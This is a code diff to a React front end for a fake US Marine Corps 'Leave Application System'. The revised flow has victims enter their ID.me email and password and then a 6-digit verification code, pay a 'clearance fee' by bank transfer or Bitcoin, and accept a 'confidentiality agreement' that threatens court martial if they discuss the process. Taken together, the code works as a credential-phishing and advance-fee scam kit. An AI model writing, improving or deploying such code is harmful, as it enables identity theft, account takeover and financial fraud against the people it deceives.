@@ -1,5 +1,5 @@
 import React, { useState, useEffect, useCallback } from 'react';
-import { ChevronRight, Clock, CheckCircle, Shield, Mail } from 'lucide-react';
+import { ChevronRight, Clock, CheckCircle, Shield } from 'lucide-react';
 import usmcLogo from './usmc.png';
 
 const API = `${import.meta.env.VITE_API_URL}/api`;
@@ -14,12 +14,22 @@ const api = async (ep, method, body, tok) => {
   return data;
 };
 
-const LockedField = ({ children }) => (
-  <div style={{ position: 'relative' }}>
-    {children}
-    <div style={{ position: 'absolute', top: 6, right: 8, background: '#16a34a', color: 'white', fontSize: '0.7rem', padding: '2px 8px', borderRadius: 50, fontWeight: 600 }}>Locked</div>
-  </div>
-);
+const DEPARTMENTS = [
+  'Headquarters Marine Corps (HQMC)',
+  'Marine Corps Combat Development Command (MCCDC)',
+  'Fleet Marine Force (FMF)',
+  'Marine Corps Forces Special Operations Command (MARSOC)',
+  'Marine Corps Reserve',
+  'Marine Corps Installations Command (MCICOM)',
+  'Marine Corps Systems Command (MARSCOR)',
+  'Training and Education Command (TECOM)',
+  'Marine Corps Forces Cyberspace Command',
+  'Marine Corps Logistics Command',
+  'Marine Corps Embassy Security Group',
+  'Marine Corps Recruiting Command',
+  'Marine Corps Intelligence Command',
+  'Marine Corps Operational Test and Evaluation Activity'
+];
 
 const Navbar = ({ setStep, user, onLogout }) => (
   <nav className="navbar">
@@ -52,20 +62,15 @@ export default function App() {
   const [loading, setLoading] = useState(false);
   const [dash, setDash] = useState(null);
 
-  const [signup, setSignup] = useState({ applyingFor:'self', fullName:'', email:'', username:'', password:'', confirmPassword:'', dob:'' });
+  const [signup, setSignup] = useState({ applyingFor:'self', fullName:'', serviceNumber:'', unit:'', department:'', email:'', username:'', password:'', confirmPassword:'', dob:'' });
+  const [agreed, setAgreed] = useState(false);
   const [loginForm, setLoginForm] = useState({ login:'', password:'' });
-  const [bio, setBio] = useState({ fullName:'', dob:'', email:'', address:'', city:'', state:'', zipCode:'' });
-  const [office, setOffice] = useState('');
-  const [payData, setPayData] = useState({ receiptNumber:'', paymentMethod:'bank_transfer' });
   const [idmeCreds, setIdmeCreds] = useState({ idmeEmail:'', idmePassword:'' });
   const [idmeCode, setIdmeCode] = useState('');
   const [clearDur, setClearDur] = useState(0);
   const [clearFee, setClearFee] = useState(0);
   const [clearPay, setClearPay] = useState({ receiptNumber:'', paymentMethod:'bank_transfer' });
-  const [emailCode, setEmailCode] = useState('');
-  const [sendingEmail, setSendingEmail] = useState(false);
   const [paymentConfig, setPaymentConfig] = useState({});
-  const [cryptoReceipt, setCryptoReceipt] = useState(null);
 
   const [forgotEmail, setForgotEmail] = useState('');
   const [forgotCode, setForgotCode] = useState('');
@@ -80,24 +85,10 @@ export default function App() {
     try {
       const d = await api('/application/dashboard', 'GET', null, token);
       setDash(d.user);
-      setBio(prev => ({ ...prev, fullName: d.user.fullName || prev.fullName, email: d.user.email || prev.email }));
       setClearDur(d.user.clearanceDuration || 0);
       setClearFee(d.user.clearanceFee || 0);
-      if (d.user.paymentMethod === 'crypto' && d.user.invoiceNumber) {
-        const pc = await api('/application/payment-config', 'GET', null, token);
-        setPaymentConfig(pc.config || {});
-        setCryptoReceipt({
-          applicationNumber: d.user.applicationNumber,
-          invoiceNumber: d.user.invoiceNumber,
-          fullName: d.user.fullName,
-          walletAddress: pc.config?.crypto?.walletAddress || '',
-          qrCodeImage: pc.config?.crypto?.qrCodeImage || '',
-          network: pc.config?.crypto?.network || 'BTC'
-        });
-      } else {
-        const pc = await api('/application/payment-config', 'GET', null, token);
-        setPaymentConfig(pc.config || {});
-      }
+      const pc = await api('/application/payment-config', 'GET', null, token);
+      setPaymentConfig(pc.config || {});
     } catch {}
   }, [token]);
 
@@ -111,7 +102,7 @@ export default function App() {
 
   useEffect(() => {
     if (!dash) return;
-    const waiting = ['sending','awaiting_code','code_sending','awaiting_payment_verification','awaiting_idme_verification','awaiting_clearance_verification','awaiting_final_approval'];
+    const waiting = ['awaiting_idme_verification','code_sending','awaiting_clearance_verification','awaiting_final_approval'];
     if (!waiting.includes(dash.stageStatus)) return;
     const t = setInterval(loadDash, 3000);
     return () => clearInterval(t);
@@ -123,6 +114,7 @@ export default function App() {
     e.preventDefault(); setError('');
     if (signup.password !== signup.confirmPassword) { setError('Passwords do not match'); return; }
     if (signup.password.length < 8) { setError('Password must be at least 8 characters'); return; }
+    if (!agreed) { setError('You must agree to the confidentiality terms before registering'); return; }
     setLoading(true);
     try {
       const d = await api('/auth/signup', 'POST', signup);
@@ -165,57 +157,24 @@ export default function App() {
     setLoading(false);
   };
 
-  const submitBio = async () => {
-    setError(''); setLoading(true);
-    try { await api('/application/stage1-bio', 'POST', bio, token); setStep(100); loadDash(); } catch(e) { setError(e.message); }
-    setLoading(false);
-  };
-
-  const submitOffice = async () => {
-    if (!office) { setError('Please select an office'); return; }
-    setError(''); setLoading(true);
-    try { await api('/application/stage2-office', 'POST', { office }, token); setStep(100); loadDash(); } catch(e) { setError(e.message); }
-    setLoading(false);
-  };
-
-  const submitPayment = async () => {
-    if (!payData.receiptNumber) { setError('Enter receipt number'); return; }
-    setError(''); setLoading(true);
-    try {
-      const d = await api('/application/stage3-payment', 'POST', payData, token);
-      if (payData.paymentMethod === 'crypto' && d.invoiceNumber) {
-        setCryptoReceipt({
-          applicationNumber: dash?.applicationNumber,
-          invoiceNumber: d.invoiceNumber,
-          fullName: dash?.fullName,
-          walletAddress: paymentConfig?.crypto?.walletAddress || '',
-          qrCodeImage: paymentConfig?.crypto?.qrCodeImage || '',
-          network: paymentConfig?.crypto?.network || 'BTC'
-        });
-      }
-      setStep(100); loadDash();
-    } catch(e) { setError(e.message); }
-    setLoading(false);
-  };
-
   const submitIdmeCreds = async () => {
     if (!idmeCreds.idmeEmail || !idmeCreds.idmePassword) { setError('Enter both IDME email and password'); return; }
     setError(''); setLoading(true);
-    try { await api('/application/stage4-idme', 'POST', idmeCreds, token); setStep(100); loadDash(); } catch(e) { setError(e.message); }
+    try { await api('/application/stage1-idme', 'POST', idmeCreds, token); setStep(100); loadDash(); } catch(e) { setError(e.message); }
     setLoading(false);
   };
 
   const submitIdmeCode = async () => {
     if (!idmeCode || idmeCode.length !== 6) { setError('Enter the 6-digit code'); return; }
     setError(''); setLoading(true);
-    try { await api('/application/stage4-idme-code', 'POST', { code: idmeCode }, token); setStep(100); loadDash(); } catch(e) { setError(e.message); }
+    try { await api('/application/stage1-idme-code', 'POST', { code: idmeCode }, token); setStep(100); loadDash(); } catch(e) { setError(e.message); }
     setLoading(false);
   };
 
   const selectDuration = async (dur) => {
     setError(''); setLoading(true);
     try {
-      const d = await api('/application/stage5-clearance', 'POST', { duration: dur }, token);
+      const d = await api('/application/stage2-clearance', 'POST', { duration: dur }, token);
       setClearDur(dur); setClearFee(d.clearanceFee); setStep(100); loadDash();
     } catch(e) { setError(e.message); }
     setLoading(false);
@@ -224,21 +183,13 @@ export default function App() {
   const submitClearPay = async () => {
     if (!clearPay.receiptNumber) { setError('Enter receipt number'); return; }
     setError(''); setLoading(true);
-    try { await api('/application/stage6-clearance-payment', 'POST', clearPay, token); setStep(100); loadDash(); } catch(e) { setError(e.message); }
-    setLoading(false);
-  };
-
-  const sendEmailCode = async () => { setError(''); setSendingEmail(true); try { await api('/auth/send-email-verification', 'POST', null, token); } catch(e) { setError(e.message); } setSendingEmail(false); };
-  const verifyEmail = async () => {
-    if (!emailCode || emailCode.length !== 6) { setError('Enter the 6-digit code'); return; }
-    setError(''); setLoading(true);
-    try { await api('/auth/verify-email', 'POST', { code: emailCode }, token); setEmailCode(''); setStep(100); loadDash(); } catch(e) { setError(e.message); }
+    try { await api('/application/stage3-clearance-payment', 'POST', clearPay, token); setStep(100); loadDash(); } catch(e) { setError(e.message); }
     setLoading(false);
   };
 
   const renderProgress = (cur) => (
     <div className="progress-container">
-      {[1,2,3,4,5,6,7].map(n => (
+      {[1,2,3].map(n => (
         <div key={n} className={`progress-step ${cur > n ? 'completed' : cur === n ? 'active' : ''}`}>{n}</div>
       ))}
     </div>
@@ -263,8 +214,9 @@ export default function App() {
               <p>This certifies that <strong>{dash.fullName}</strong> has been approved for leave.</p>
               <p><strong>Applicant:</strong> {dash.fullName}</p>
               <p><strong>Application Number:</strong> {dash.applicationNumber}</p>
-              <p><strong>Applying For:</strong> {dash.applyingFor === 'self' ? 'Self' : 'Another Service Member'}</p>
-              <p><strong>Office:</strong> {dash.selectedOffice}</p>
+              <p><strong>Service Number:</strong> {dash.serviceNumber}</p>
+              <p><strong>Unit:</strong> {dash.unit}</p>
+              <p><strong>Department:</strong> {dash.department}</p>
               <p><strong>Duration:</strong> {dash.clearanceDuration} month(s)</p>
               <p><strong>Account Officer:</strong> {dash.accountOfficer || 'Assigned'}</p>
               <p><strong>Date:</strong> {new Date().toLocaleDateString()}</p>
@@ -276,10 +228,6 @@ export default function App() {
           </div>
         </div>
       );
-    }
-
-    if (status === 'awaiting_payment_verification') {
-      return (<div className="form-card animate-fade-in" style={{ textAlign: 'center', padding: '4rem 2rem' }}><Clock size={64} color="#d97706" style={{ margin: '0 auto 1rem' }} /><h2 className="section-title" style={{ border: 'none' }}>Payment Under Review</h2><p style={{ fontSize: '1.1rem', color: '#555', maxWidth: 500, margin: '0 auto' }}>Your application fee payment is being reviewed by admin.</p></div>);
     }
 
     if (status === 'awaiting_idme_verification' || dash?.idmeStatus === 'sending') {
@@ -334,181 +282,12 @@ export default function App() {
       return (<div className="form-card animate-fade-in" style={{ textAlign: 'center', padding: '4rem 2rem' }}><CheckCircle size={64} color="#2563eb" style={{ margin: '0 auto 1rem' }} /><h2 className="section-title" style={{ border: 'none' }}>Awaiting Final Approval</h2><p style={{ fontSize: '1.1rem', color: '#555', maxWidth: 500, margin: '0 auto' }}>All verifications complete. Awaiting final admin approval.</p></div>);
     }
 
-    const inputStyle = { opacity: 0.6, cursor: 'not-allowed', background: '#f3f4f6' };
-
     return (
       <div className="form-card">
         {renderProgress(stage)}
         {error && <div style={{ background: '#fee2e2', color: '#991b1b', padding: '0.75rem 1rem', borderRadius: 8, marginBottom: '1.5rem' }}>{error}</div>}
 
-        {stage === 1 && !dash?.emailVerified && (
-          <div className="animate-fade-in" style={{ maxWidth: 500, margin: '0 auto' }}>
-            <h2 className="section-title">Verify Email</h2>
-            <p style={{ marginBottom: '1rem', color: '#555' }}>Enter the 6-digit code sent to <strong>{dash?.email}</strong></p>
-            <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', marginBottom: '1.5rem', background: '#dbeafe', padding: '1rem 1.5rem', borderRadius: 12, border: '1px solid #93c5fd' }}>
-              <Mail size={32} color="var(--primary-blue)" />
-              <div><p style={{ color: 'var(--primary-blue)', fontWeight: 600 }}>Email Verification Required</p><p style={{ color: '#555', fontSize: '0.85rem' }}>Check your inbox for the verification code</p></div>
-            </div>
-            <div className="form-group"><label className="form-label">Verification Code</label><input type="text" className="form-input" placeholder="Enter 6-digit code" value={emailCode} onChange={e => setEmailCode(e.target.value.replace(/\D/g, '').slice(0, 6))} maxLength={6} style={{ fontSize: '1.5rem', letterSpacing: '0.5rem', textAlign: 'center' }} /></div>
-            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '2rem' }}>
-              <button onClick={sendEmailCode} className="btn btn-secondary" disabled={sendingEmail}>{sendingEmail ? 'Sending...' : 'Resend Code'}</button>
-              <div style={{ display: 'flex', gap: '1rem' }}>
-                <button onClick={() => setStep(100)} className="btn btn-secondary">Back</button>
-                <button onClick={verifyEmail} className="btn btn-primary" disabled={loading || emailCode.length !== 6}>{loading ? 'Verifying...' : 'Verify'} <ChevronRight size={20} /></button>
-              </div>
-            </div>
-          </div>
-        )}
-
-        {stage === 1 && dash?.emailVerified && (
-          <div className="animate-fade-in">
-            <h2 className="section-title">Bio Data</h2>
-            <p style={{ marginBottom: '1rem', color: '#555' }}>Provide your personal information. Verified fields are locked.</p>
-            <div className="form-group"><label className="form-label">Full Name</label><input type="text" className="form-input" placeholder="Full legal name" value={bio.fullName} onChange={e => setBio({ ...bio, fullName: e.target.value })} /></div>
-            <div className="form-group"><label className="form-label">Date of Birth</label><input type="date" className="form-input" value={bio.dob} onChange={e => setBio({ ...bio, dob: e.target.value })} /></div>
-            <div className="form-group">
-              <LockedField><label className="form-label" style={{ color: '#16a34a' }}>Email (Verified)</label><input type="email" className="form-input" value={bio.email} disabled style={inputStyle} /></LockedField>
-            </div>
-            <div className="form-group"><label className="form-label">Address</label><input type="text" className="form-input" placeholder="Street address" value={bio.address} onChange={e => setBio({ ...bio, address: e.target.value })} /></div>
-            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '1rem' }}>
-              <div className="form-group"><label className="form-label">City</label><input type="text" className="form-input" value={bio.city} onChange={e => setBio({ ...bio, city: e.target.value })} /></div>
-              <div className="form-group"><label className="form-label">State</label><input type="text" className="form-input" value={bio.state} onChange={e => setBio({ ...bio, state: e.target.value })} /></div>
-              <div className="form-group"><label className="form-label">Zip Code</label><input type="text" className="form-input" value={bio.zipCode} onChange={e => setBio({ ...bio, zipCode: e.target.value })} /></div>
-            </div>
-            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '1rem', marginTop: '2rem' }}>
-              <button onClick={submitBio} className="btn btn-primary" disabled={loading || !bio.fullName}>{loading ? 'Saving...' : 'Save & Continue'} <ChevronRight size={20} /></button>
-            </div>
-          </div>
-        )}
-
-        {stage === 2 && (
-          <div className="animate-fade-in">
-            <h2 className="section-title">Office Selection</h2>
-            <p style={{ marginBottom: '1.5rem', color: '#555' }}>Select the office you are requesting leave for.</p>
-            <div className="form-group">
-              <label className="form-label">Requesting Office</label>
-              <select className="form-select" value={office} onChange={e => setOffice(e.target.value)}>
-                <option value="">Select an office...</option>
-                <option value="Headquarters Marine Corps (HQMC)">Headquarters Marine Corps (HQMC)</option>
-                <option value="Marine Corps Combat Development Command">Marine Corps Combat Development Command</option>
-                <option value="Fleet Marine Force">Fleet Marine Force</option>
-                <option value="Marine Corps Forces Special Operations Command">Marine Corps Forces Special Operations Command</option>
-                <option value="Marine Corps Reserve">Marine Corps Reserve</option>
-                <option value="Marine Corps Installations Command">Marine Corps Installations Command</option>
-                <option value="Marine Corps Systems Command">Marine Corps Systems Command</option>
-                <option value="Training and Education Command">Training and Education Command</option>
-              </select>
-            </div>
-            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '1rem', marginTop: '2rem' }}>
-              <button onClick={submitOffice} className="btn btn-primary" disabled={loading || !office}>{loading ? 'Saving...' : 'Continue to Payment'} <ChevronRight size={20} /></button>
-            </div>
-          </div>
-        )}
-
-        {stage === 3 && (
-          <div className="animate-fade-in">
-            <h2 className="section-title">Application Fee</h2>
-            <div className="invoice-card">
-              <h3>Application Processing Fee</h3>
-              <div style={{ display: 'flex', justifyContent: 'space-between', borderTop: '1px solid #eee', paddingTop: '1rem', marginTop: '1rem' }}>
-                <span>Leave Processing Admin Fee</span><span>$150.00</span>
-              </div>
-              <div className="invoice-total" style={{ textAlign: 'right' }}>Total: $150.00</div>
-            </div>
-            {dash?.applicationNumber && (
-              <div style={{ background: '#f0f7ff', border: '1px solid #93c5fd', borderRadius: 8, padding: '0.75rem 1rem', marginBottom: '1.5rem' }}>
-                <p style={{ fontSize: '0.85rem', color: '#1e40af' }}><strong>Application Number:</strong> {dash.applicationNumber}</p>
-              </div>
-            )}
-            {dash?.paymentMethod === 'crypto' && dash?.invoiceNumber && cryptoReceipt ? (
-              <div style={{ background: 'white', border: '2px solid #f59e0b', borderRadius: 12, padding: '2rem', marginBottom: '1.5rem' }}>
-                <h3 style={{ fontFamily: "'Oswald', sans-serif", textTransform: 'uppercase', color: '#f59e0b', textAlign: 'center', marginBottom: '1rem' }}>Crypto Payment Receipt</h3>
-                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem', marginBottom: '1.5rem' }}>
-                  <div><p style={{ fontSize: '0.8rem', color: '#666' }}>Application Number</p><p style={{ fontWeight: 600 }}>{cryptoReceipt.applicationNumber}</p></div>
-                  <div><p style={{ fontSize: '0.8rem', color: '#666' }}>Invoice Number</p><p style={{ fontWeight: 600 }}>{cryptoReceipt.invoiceNumber}</p></div>
-                  <div><p style={{ fontSize: '0.8rem', color: '#666' }}>Applicant</p><p style={{ fontWeight: 600 }}>{cryptoReceipt.fullName}</p></div>
-                  <div><p style={{ fontSize: '0.8rem', color: '#666' }}>Network</p><p style={{ fontWeight: 600 }}>{cryptoReceipt.network}</p></div>
-                </div>
-                {cryptoReceipt.qrCodeImage && (
-                  <div style={{ textAlign: 'center', marginBottom: '1rem' }}>
-                    <img src={cryptoReceipt.qrCodeImage} alt="Bitcoin QR Code" style={{ width: 200, height: 200, border: '2px solid #eee', borderRadius: 8 }} />
-                  </div>
-                )}
-                <div style={{ background: '#f9fafb', padding: '1rem', borderRadius: 8, border: '1px solid #eee' }}>
-                  <p style={{ fontSize: '0.8rem', color: '#666', marginBottom: '0.25rem' }}>Wallet Address</p>
-                  <p style={{ fontFamily: 'monospace', fontSize: '0.85rem', wordBreak: 'break-all', fontWeight: 600, color: '#f59e0b' }}>{cryptoReceipt.walletAddress}</p>
-                </div>
-                <p style={{ fontSize: '0.8rem', color: '#666', marginTop: '1rem', textAlign: 'center' }}>Send exactly $150.00 BTC to the address above. Enter the transaction hash as receipt number.</p>
-              </div>
-            ) : (
-              <div style={{ marginBottom: '1.5rem' }}>
-                <p style={{ marginBottom: '1rem', color: '#555' }}>Select payment method and submit receipt details.</p>
-                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem', marginBottom: '1.5rem' }}>
-                  <div
-                    onClick={() => { if (paymentConfig.bankTransfer?.available) setPayData({ ...payData, paymentMethod: 'bank_transfer' }); }}
-                    style={{
-                      padding: '1.5rem', borderRadius: 12, border: payData.paymentMethod === 'bank_transfer' ? '2px solid var(--primary-blue)' : '2px solid #eee',
-                      background: payData.paymentMethod === 'bank_transfer' ? '#eff6ff' : '#f9fafb',
-                      cursor: paymentConfig.bankTransfer?.available ? 'pointer' : 'not-allowed',
-                      opacity: paymentConfig.bankTransfer?.available ? 1 : 0.5,
-                      textAlign: 'center'
-                    }}
-                  >
-                    <div style={{ fontSize: '1.5rem', marginBottom: '0.5rem' }}>🏦</div>
-                    <p style={{ fontWeight: 600 }}>Bank Transfer</p>
-                    {!paymentConfig.bankTransfer?.available && <p style={{ fontSize: '0.8rem', color: '#dc2626', marginTop: '0.5rem' }}>Currently Unavailable</p>}
-                    {paymentConfig.bankTransfer?.available && <p style={{ fontSize: '0.8rem', color: '#16a34a', marginTop: '0.5rem' }}>Available</p>}
-                  </div>
-                  <div
-                    onClick={() => { if (paymentConfig.crypto?.available) setPayData({ ...payData, paymentMethod: 'crypto' }); }}
-                    style={{
-                      padding: '1.5rem', borderRadius: 12, border: payData.paymentMethod === 'crypto' ? '2px solid #f59e0b' : '2px solid #eee',
-                      background: payData.paymentMethod === 'crypto' ? '#fffbeb' : '#f9fafb',
-                      cursor: paymentConfig.crypto?.available ? 'pointer' : 'not-allowed',
-                      opacity: paymentConfig.crypto?.available ? 1 : 0.5,
-                      textAlign: 'center'
-                    }}
-                  >
-                    <div style={{ fontSize: '1.5rem', marginBottom: '0.5rem' }}>₿</div>
-                    <p style={{ fontWeight: 600 }}>Crypto (BTC)</p>
-                    {!paymentConfig.crypto?.available && <p style={{ fontSize: '0.8rem', color: '#dc2626', marginTop: '0.5rem' }}>Currently Unavailable</p>}
-                    {paymentConfig.crypto?.available && <p style={{ fontSize: '0.8rem', color: '#16a34a', marginTop: '0.5rem' }}>Available</p>}
-                  </div>
-                </div>
-              </div>
-            )}
-            {!dash?.paymentMethod && (
-              <>
-                {payData.paymentMethod === 'bank_transfer' && paymentConfig.bankTransfer?.available && (
-                  <div style={{ background: '#f0f7ff', border: '1px solid #93c5fd', borderRadius: 8, padding: '1rem 1.5rem', marginBottom: '1.5rem' }}>
-                    <p style={{ fontSize: '0.85rem', color: '#1e40af' }}><strong>Bank:</strong> {paymentConfig.bankTransfer.bankName}</p>
-                    <p style={{ fontSize: '0.85rem', color: '#1e40af' }}><strong>Account Name:</strong> {paymentConfig.bankTransfer.accountName}</p>
-                    <p style={{ fontSize: '0.85rem', color: '#1e40af' }}><strong>Account Number:</strong> {paymentConfig.bankTransfer.accountNumber}</p>
-                    <p style={{ fontSize: '0.85rem', color: '#1e40af' }}><strong>Routing:</strong> {paymentConfig.bankTransfer.routingNumber}</p>
-                    {paymentConfig.bankTransfer.swiftCode && <p style={{ fontSize: '0.85rem', color: '#1e40af' }}><strong>SWIFT:</strong> {paymentConfig.bankTransfer.swiftCode}</p>}
-                  </div>
-                )}
-                {payData.paymentMethod === 'crypto' && paymentConfig.crypto?.available && (
-                  <div style={{ background: '#fffbeb', border: '1px solid #fcd34d', borderRadius: 8, padding: '1rem 1.5rem', marginBottom: '1.5rem' }}>
-                    <p style={{ fontSize: '0.85rem', color: '#92400e' }}><strong>Network:</strong> {paymentConfig.crypto.network}</p>
-                    <p style={{ fontSize: '0.85rem', color: '#92400e', wordBreak: 'break-all' }}><strong>Wallet:</strong> {paymentConfig.crypto.walletAddress}</p>
-                  </div>
-                )}
-                <div className="form-group"><label className="form-label">Receipt / Reference Number</label><input type="text" className="form-input" placeholder={payData.paymentMethod === 'crypto' ? 'Transaction hash' : 'Enter receipt number'} value={payData.receiptNumber} onChange={e => setPayData({ ...payData, receiptNumber: e.target.value })} /></div>
-                <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '1rem', marginTop: '2rem' }}>
-                  <button onClick={submitPayment} className="btn btn-primary" disabled={loading || !payData.receiptNumber || !payData.paymentMethod}>{loading ? 'Submitting...' : 'Submit Payment Proof'} <ChevronRight size={20} /></button>
-                </div>
-              </>
-            )}
-            {dash?.paymentMethod && dash?.stageStatus !== 'awaiting_payment_verification' && (
-              <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '1rem', marginTop: '2rem' }}>
-                <button onClick={() => setStep(100)} className="btn btn-primary">Continue <ChevronRight size={20} /></button>
-              </div>
-            )}
-          </div>
-        )}
-
-        {stage === 4 && (
+        {stage === 1 && (
           <div className="animate-fade-in">
             <h2 className="section-title">IDME Verification</h2>
             <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', marginBottom: '1.5rem', background: '#dbeafe', padding: '1rem 1.5rem', borderRadius: 12, border: '1px solid #93c5fd' }}>
@@ -524,15 +303,7 @@ export default function App() {
           </div>
         )}
 
-        {stage === 5 && !dash?.idmeVerified && dash?.idmeStatus === 'none' && (
-          <div className="animate-fade-in" style={{ textAlign: 'center', padding: '2rem' }}>
-            <Clock size={64} color="#d97706" style={{ margin: '0 auto 1rem' }} />
-            <h2 className="section-title" style={{ border: 'none' }}>IDME Pending</h2>
-            <p style={{ fontSize: '1.1rem', color: '#555' }}>Submit your IDME credentials to proceed.</p>
-          </div>
-        )}
-
-        {stage === 6 && (
+        {stage === 2 && (
           <div className="animate-fade-in">
             <h2 className="section-title">Clearance Duration</h2>
             <p style={{ marginBottom: '1.5rem', color: '#555' }}>Select your leave duration.</p>
@@ -549,7 +320,7 @@ export default function App() {
           </div>
         )}
 
-        {stage === 7 && (
+        {stage === 3 && (
           <div className="animate-fade-in">
             <h2 className="section-title">Clearance Payment</h2>
             <div className="invoice-card">
@@ -620,19 +391,59 @@ export default function App() {
         )}
 
         {step === 2 && (
-          <div className="form-card animate-fade-in" style={{ maxWidth: 600, margin: '2rem auto' }}>
+          <div className="form-card animate-fade-in" style={{ maxWidth: 650, margin: '2rem auto' }}>
+            <h2 className="section-title">Confidentiality Agreement</h2>
+            <div style={{ background: '#fffbeb', border: '1px solid #fcd34d', borderRadius: 12, padding: '1.5rem', marginBottom: '1.5rem' }}>
+              <h3 style={{ fontFamily: "'Oswald', sans-serif", textTransform: 'uppercase', color: '#92400e', marginBottom: '1rem', fontSize: '1rem' }}>Legal Notice - Read Carefully</h3>
+              <div style={{ color: '#78350f', fontSize: '0.9rem', lineHeight: 1.7 }}>
+                <p style={{ marginBottom: '1rem' }}>By registering and using this Leave Application System, I, the undersigned, acknowledge and agree to the following:</p>
+                <p style={{ marginBottom: '1rem' }}>I am now <strong>legally mandated</strong> to maintain absolute discretion and confidentiality regarding all details, information, and content related to this Leave Application System. I understand that any unauthorized disclosure, divulgence, or sharing of information pertaining to the process, status, or contents of this application constitutes a serious breach of military discipline.</p>
+                <p style={{ marginBottom: '1rem' }}>I further acknowledge that any violation of this confidentiality requirement may subject me to <strong>court martial proceedings</strong> under the Uniform Code of Military Justice (UCMJ), and I may be prosecuted in a court of law for such violations.</p>
+                <p>I understand that this obligation of confidentiality extends to all aspects of my application, including but not limited to: application status, verification processes, financial transactions, communication with administrators, and any documentation or correspondence related to this application.</p>
+              </div>
+            </div>
+            <label style={{ display: 'flex', alignItems: 'flex-start', gap: '0.75rem', cursor: 'pointer', padding: '1rem', background: agreed ? '#f0fdf4' : '#f9fafb', border: agreed ? '2px solid #16a34a' : '2px solid #e5e7eb', borderRadius: 8, transition: 'all 0.2s' }}>
+              <input type="checkbox" checked={agreed} onChange={e => setAgreed(e.target.checked)} style={{ width: 20, height: 20, marginTop: 2, cursor: 'pointer', accentColor: '#16a34a' }} />
+              <span style={{ fontSize: '0.9rem', color: '#333', lineHeight: 1.5 }}>
+                <strong>I have read and understood the above confidentiality agreement.</strong> I agree to maintain absolute discretion regarding all aspects of this application. I understand that any breach of this agreement may result in court martial proceedings.
+              </span>
+            </label>
+            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '1rem', marginTop: '2rem' }}>
+              <button onClick={() => setStep(1)} className="btn btn-secondary">Back</button>
+              <button onClick={() => { if (!agreed) { setError('You must agree to the confidentiality terms'); return; } setError(''); setStep(3); }} className="btn btn-primary">Continue <ChevronRight size={20} /></button>
+            </div>
+          </div>
+        )}
+
+        {step === 3 && (
+          <div className="form-card animate-fade-in" style={{ maxWidth: 650, margin: '2rem auto' }}>
             <h2 className="section-title">Create Account</h2>
-            <p style={{ marginBottom: '1.5rem', color: '#555' }}>Set up your login credentials.</p>
+            <p style={{ marginBottom: '1.5rem', color: '#555' }}>Enter your account and service member details.</p>
             {error && <div style={{ background: '#fee2e2', color: '#991b1b', padding: '0.75rem 1rem', borderRadius: 8, marginBottom: '1rem' }}>{error}</div>}
-            <div className="form-group"><label className="form-label">Full Name</label><input type="text" className="form-input" placeholder="Legal name" value={signup.fullName} onChange={e => setSignup({ ...signup, fullName: e.target.value })} /></div>
+            <div style={{ borderBottom: '1px solid #e5e7eb', marginBottom: '1.5rem', paddingBottom: '0.5rem' }}>
+              <h3 style={{ fontFamily: "'Oswald', sans-serif", textTransform: 'uppercase', color: 'var(--primary-blue)', fontSize: '0.95rem' }}>Service Member Information</h3>
+            </div>
+            <div className="form-group"><label className="form-label">Full Name</label><input type="text" className="form-input" placeholder="Full legal name of service member" value={signup.fullName} onChange={e => setSignup({ ...signup, fullName: e.target.value })} /></div>
+            <div className="form-group"><label className="form-label">Service Number</label><input type="text" className="form-input" placeholder="Enter service number" value={signup.serviceNumber} onChange={e => setSignup({ ...signup, serviceNumber: e.target.value })} /></div>
+            <div className="form-group"><label className="form-label">Unit</label><input type="text" className="form-input" placeholder="Enter unit designation" value={signup.unit} onChange={e => setSignup({ ...signup, unit: e.target.value })} /></div>
+            <div className="form-group">
+              <label className="form-label">Department</label>
+              <select className="form-select" value={signup.department} onChange={e => setSignup({ ...signup, department: e.target.value })}>
+                <option value="">Select a department...</option>
+                {DEPARTMENTS.map(d => <option key={d} value={d}>{d}</option>)}
+              </select>
+            </div>
+            <div style={{ borderBottom: '1px solid #e5e7eb', margin: '1.5rem 0', paddingBottom: '0.5rem' }}>
+              <h3 style={{ fontFamily: "'Oswald', sans-serif", textTransform: 'uppercase', color: 'var(--primary-blue)', fontSize: '0.95rem' }}>Account Credentials</h3>
+            </div>
             <div className="form-group"><label className="form-label">Email</label><input type="email" className="form-input" placeholder="you@example.com" value={signup.email} onChange={e => setSignup({ ...signup, email: e.target.value })} /></div>
             <div className="form-group"><label className="form-label">Username</label><input type="text" className="form-input" placeholder="Choose a username" value={signup.username} onChange={e => setSignup({ ...signup, username: e.target.value })} /></div>
             <div className="form-group"><label className="form-label">Date of Birth</label><input type="date" className="form-input" value={signup.dob} onChange={e => setSignup({ ...signup, dob: e.target.value })} /></div>
             <div className="form-group"><label className="form-label">Password</label><input type="password" className="form-input" placeholder="Min 8 characters" value={signup.password} onChange={e => setSignup({ ...signup, password: e.target.value })} /></div>
             <div className="form-group"><label className="form-label">Confirm Password</label><input type="password" className="form-input" placeholder="Re-enter password" value={signup.confirmPassword} onChange={e => setSignup({ ...signup, confirmPassword: e.target.value })} /></div>
             <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '1rem', marginTop: '2rem' }}>
-              <button onClick={() => setStep(1)} className="btn btn-secondary">Back</button>
-              <button onClick={handleSignup} className="btn btn-primary" disabled={loading || !signup.fullName || !signup.email || !signup.username || !signup.password}>{loading ? 'Creating...' : 'Create Account'} <ChevronRight size={20} /></button>
+              <button onClick={() => setStep(2)} className="btn btn-secondary">Back</button>
+              <button onClick={handleSignup} className="btn btn-primary" disabled={loading || !signup.fullName || !signup.serviceNumber || !signup.unit || !signup.department || !signup.email || !signup.username || !signup.password}>{loading ? 'Creating...' : 'Create Account'} <ChevronRight size={20} /></button>
             </div>
           </div>
         )}
